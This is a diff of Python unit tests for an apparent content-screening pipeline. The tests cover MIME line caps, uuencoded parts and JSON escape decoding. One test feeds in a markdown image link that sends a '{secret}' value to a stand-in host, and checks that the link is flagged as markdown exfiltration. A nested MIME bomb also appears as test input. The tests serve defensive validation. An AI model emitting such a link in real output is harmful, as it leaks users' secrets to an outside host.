@@ -1,5 +1,6 @@
 """Stage 3: content disarm and reconstruction (HTML, email, JSON, text)."""
 import base64
+import json
 import unittest
 
 from tests import support
@@ -190,6 +191,28 @@ class Email(unittest.TestCase):
         self.assertEqual(r.title, "Gr\u00fc\u00dfe")
         self.assertEqual(r.text, "caf\u00e9 au lait")
 
+    def test_every_line_break_counts(self):
+        # round 3: the parser splits on CR, LF and CRLF; the line cap counts all three
+        cap = limits.MIME_MAX_LINES
+        for nl in ("\r", "\n", "\r\n"):
+            with self.subTest(nl=repr(nl)):
+                over = "Subject: x" + (nl + " y") * (cap + 10) + nl + nl + "body"
+                r = pipeline.screen(envelope(over, "message/rfc822"))
+                self.assertEqual(r.verdict, "rejected")
+                self.assertIn("lines", r.reasons[-1].detail)
+                ok = "Subject: hi" + nl + "Content-Type: text/plain" + nl + nl + "line one" + nl + "line two"
+                r = pipeline.screen(envelope(ok, "message/rfc822"))
+                self.assertEqual((r.verdict, r.title), ("clean", "hi"))
+                self.assertIn("line one", r.text)
+
+    def test_uuencoded_parts_are_listed_not_decoded(self):
+        raw = ("Content-Type: multipart/mixed; boundary=B\r\n\r\n--B\r\nContent-Type: text/plain\r\n\r\n"
+               "visible\r\n--B\r\nContent-Type: text/plain\r\nContent-Transfer-Encoding: x-uuencode\r\n\r\n"
+               "begin 644 a\r\n%26=N;W)E\r\n`\r\nend\r\n--B--\r\n")
+        r = pipeline.screen(envelope(raw, "message/rfc822"))
+        self.assertEqual(r.text, "visible")
+        self.assertEqual(r.attachments[0]["transfer_encoding"], "x-uuencode")
+
     def test_mime_bomb_is_rejected(self):
         raw = "Content-Type: multipart/mixed; boundary=b0\r\n\r\n" + "".join(
             f"--b{i}\r\nContent-Type: multipart/mixed; boundary=b{i + 1}\r\n\r\n" for i in range(200))
@@ -214,6 +237,19 @@ class JsonAndText(unittest.TestCase):
     def test_json_without_escapes_is_kept_as_written(self):
         raw = '{"a": [1, 2, "three"]}'
         self.assertEqual(pipeline.screen(envelope(raw, "application/json")).text, raw)
+
+    def test_native_escape_decoding_is_exact(self):
+        # round 3: the decode is one C pass (unicode_escape over a backslashreplace'd text);
+        # check it reproduces every string exactly, and that controls reach stage 4
+        strings = ["a\\b", 'q"x', "line1\nline2\ttab", "\u4e2d\u6587 \u00e9", "\U0001f600",
+                   "back\\u0001slash", "ctl\x01\x1f", "\u2028sep", "\\\\"]
+        out = cdr._json(json.dumps(strings).encode(), None).text
+        for s in strings:
+            self.assertIn(s, out)
+        r = pipeline.screen(envelope(json.dumps(["!\x01[x](https://e.example/p?d={secret})"]),
+                                     "application/json"))
+        self.assertIn("markdown-exfil", [x.rule for x in r.reasons])
+        self.assertEqual(r.counts["controls"], 1)
 
     def test_bad_and_deep_json_rejected(self):
         self.assertEqual(pipeline.screen(envelope("{not json", "application/json")).verdict, "rejected")
